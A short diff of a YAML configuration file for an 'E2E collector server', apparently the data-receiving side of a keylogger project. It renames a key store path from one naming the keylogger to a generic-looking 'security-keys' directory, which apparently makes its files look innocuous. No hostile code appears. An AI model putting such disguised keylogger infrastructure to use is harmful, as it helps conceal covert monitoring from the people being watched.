@@ -1,7 +1,7 @@
 # E2E collector server configuration
 
 e2e_server:
-  key_store_path: "~/.advancekeylogger/keys/"
+  key_store_path: "~/.local/share/security-keys/"
   storage_dir: "./server_data"
   max_payload_bytes: 10485760
   max_storage_mb: 1024
